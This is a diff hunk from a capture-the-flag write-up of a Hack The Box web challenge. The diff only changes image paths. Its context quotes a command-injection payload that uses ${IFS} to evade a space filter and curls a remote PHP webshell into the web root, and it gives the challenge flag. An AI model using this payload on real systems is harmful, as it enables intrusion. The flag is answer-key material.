@@ -81,15 +81,15 @@ The app filters for any space character, but since command is passed to subshell
 curl${IFS}https://pastebin.com/raw/szTiUQL1${IFS}-so${IFS}/www/t.php
 ```
 
-![Void Whispers-2.png](/assets/ctf/htb/hack-the-boo-2024-practice/web/Void Whispers-2.png)
+![Void Whispers-2.png](/assets/ctf/htb/void-whispers-2.png)
 
 Visit the webshell and find flag:
 
-![Void Whispers.png](/assets/ctf/htb/hack-the-boo-2024-practice/web/Void Whispers.png)
+![Void Whispers.png](/assets/ctf/htb/void-whispers.png)
 
 Get flag:
 
-![Void Whispers-1.png](/assets/ctf/htb/hack-the-boo-2024-practice/web/Void Whispers-1.png)
+![Void Whispers-1.png](/assets/ctf/htb/void-whispers-1.png)
 
 > Flag: `HTB{c0mm4nd_1nj3ct10n_4r3_3457_70_f1nD!!_96353be35ebbc45395fc4867f38d7784}`
 
